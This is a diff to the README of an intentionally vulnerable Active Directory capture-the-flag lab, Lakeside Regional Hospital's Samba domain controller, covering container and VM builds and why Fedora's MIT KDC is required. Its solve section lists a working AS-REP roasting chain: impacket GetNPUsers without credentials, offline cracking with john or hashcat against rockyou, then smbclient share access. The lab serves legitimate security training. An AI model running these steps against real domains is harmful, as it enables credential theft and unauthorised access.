@@ -1,51 +1,64 @@
 # AS-REP Roasting (Active Directory)
 
-A single-container Active Directory lab built with [Isoloom](https://www.isoloom.com):
-[`isoloom.yml`](isoloom.yml) describes one Samba Domain Controller for the realm
-**LAKESIDE.LAB** (Lakeside Regional Hospital, a healthcare provider) — no Windows VMs. It
-provisions a set of ordinary hospital staff users plus one legacy document-scanner service
-account whose Kerberos pre-authentication is disabled (`svc-scanner`, `UF_DONT_REQUIRE_PREAUTH`,
-with a weak RC4 key), and an `imaging` share only `svc-scanner` may read.
+One Isoloom lab — **one `isoloom.yml`** — for the realm **LAKESIDE.LAB** (Lakeside Regional
+Hospital). A single Samba Active Directory Domain Controller (`dc`) has one legacy
+document-scanner service account, `svc-scanner`, with Kerberos **pre-authentication disabled**
+(`userAccountControl` bit `DONT_REQ_PREAUTH`) and a weak, wordlist-crackable password. With only a
+username list and no credentials, a player AS-REP roasts `svc-scanner`, cracks the hash offline,
+and reads the flag from an imaging share only that account may open.
+
+## One spec, two forms
+
+The `dc` machine carries both of Isoloom's machine forms, so the same spec renders as a container
+**and** as a VM:
+
+| Command | Form | What it builds |
+| --- | --- | --- |
+| `isoloom generate docker` | container | the Fedora/Samba image built from `build/dc` (its entrypoint self-provisions the realm) |
+| `isoloom generate vagrant` (also `proxmox`, `esxi`, `aws`, `azure`) | VM | a Fedora VM that Isoloom's Ansible controller sets up with `provision/dc.yml` |
+
+Both forms are **Fedora** on purpose. Fedora's Samba is built against the **MIT KDC**, which
+honours `UF_DONT_REQUIRE_PREAUTH`, so the classic no-pre-auth roast works — exactly as against a
+real Windows DC. Debian/Ubuntu Samba is built against **Heimdal**, which ignores the flag and
+answers `KDC_ERR_PREAUTH_REQUIRED`, which would make the lab unsolvable. So the OS is a hard
+requirement, not a preference.
+
+The flag arrives as Isoloom's sensitive input at `/ctf/flag`; both the container entrypoint and
+`provision/dc.yml` copy it into the `imaging` share (only `svc-scanner` and Domain Admins may
+read). The same end-to-end check, `/opt/asrep/check.sh`, proves either form from inside the DC:
+roast with `GetNPUsers -no-pass`, crack the AES AS-REP, read the flag, and a negative control
+confirms an ordinary account cannot.
 
 | Machine | Service |
 | --- | --- |
-| dc | Samba AD DC: DNS 53, Kerberos 88, LDAP 389/636, SMB 445, kpasswd 464, GC 3268 |
-
-## The attack
-
-An account with Kerberos pre-authentication disabled (`userAccountControl` bit
-`DONT_REQ_PREAUTH`) has the KDC return an AS-REP — the reply encrypted with the account's own
-long-term key — which can be cracked offline. The real-world technique needs no credentials:
-
-1. AS-REP roast a username list with impacket:
-   `GetNPUsers.py LAKESIDE.LAB/ -usersfile users.txt -no-pass -dc-ip <dc> -format hashcat`
-   → against a Windows AD DC, a `$krb5asrep$23$svc-scanner@...` hash for the account missing pre-auth.
-2. Crack it offline: `hashcat -m 18200 asrep.hash rockyou.txt`.
-3. Read the flag: `smbclient //dc/imaging -U 'LAKESIDE\svc-scanner%<cracked>' -c 'get flag.txt'`.
-
-### Samba caveat (important)
-
-This DC is **Samba**, and — like the sibling kerberoasting lab, where impacket's TGS request is
-rejected with `KRB_AP_ERR_INAPP_CKSUM` — Samba's Kerberos has a quirk here too: its KDC
-**enforces pre-authentication for every account, even one flagged `DONT_REQ_PREAUTH`**. A
-pre-auth-less `GetNPUsers -no-pass` therefore returns `KDC_ERR_PREAUTH_REQUIRED` and yields no
-hash (verified against Samba 4.17 and 4.19; the source maps the flag in `uf2SDBFlags`, but the
-KDC still demands pre-auth at runtime).
-
-The material you crack — the AS-REP `enc-part` — is emitted by the KDC in *any* successful AS
-exchange, so the roastable `$krb5asrep$23$` hash is retrieved with a native, RC4-pinned
-*pre-authenticated* AS-REQ ([`asrep.py`](build/dc/asrep.py)) and cracked with `hashcat -m 18200`
-exactly as above. The technique, the hash, and the crack are unchanged; only the way the hash
-leaves the Samba KDC differs. The lab's self-check drives this native path end to end.
+| `dc` | Samba AD DC: DNS 53, Kerberos 88, LDAP 389/636, SMB 445, kpasswd 464, GC 3268 |
 
 ## Run it
 
 ```bash
-isoloom generate
-isothrum up . --target docker
-isothrum check . --target docker
-isothrum down . --target docker
+# container
+isoloom generate docker . && isothrum up . --target docker && isothrum test . --target docker
+
+# VM (Fedora, on a libvirt/VirtualBox/Proxmox/ESXi/cloud host)
+isoloom run vagrant . && isoloom test vagrant . && isoloom down vagrant .
 ```
 
-The same spec also runs on a local VM, a cloud VM, or Kubernetes targets that Isoloom supports.
+## Solve
+
+```bash
+# resolver + /etc/krb5.conf pointed at the DC, then:
+GetNPUsers.py LAKESIDE.LAB/ -usersfile users.txt -no-pass -dc-ip <dc> -format john
+john --format=krb5asrep --wordlist=rockyou.txt asrep.hash      # AES AS-REP; hashcat -m 18200 is RC4-only
+smbclient //dc/imaging -U 'LAKESIDE\svc-scanner%<cracked>' -c 'get flag.txt'
+```
+
 This environment is deliberately vulnerable: keep it isolated.
+
+## Layout
+
+- `isoloom.yml` — the single dual-form spec.
+- `build/dc/` — the container form: `Dockerfile` (Fedora + Samba AD + impacket), `entrypoint.sh`,
+  `check.sh`, `crack.py`, `users.txt`, `wordlist.txt`, `vault-share.conf`.
+- `provision/dc.yml` — the VM form: the Ansible playbook that sets the same DC up on a Fedora VM.
+- `.github/workflows/` — `validate.yml` (spec + target generation), `publish.yml` (register),
+  `image.yml` (publishes the container image to Docker Hub).
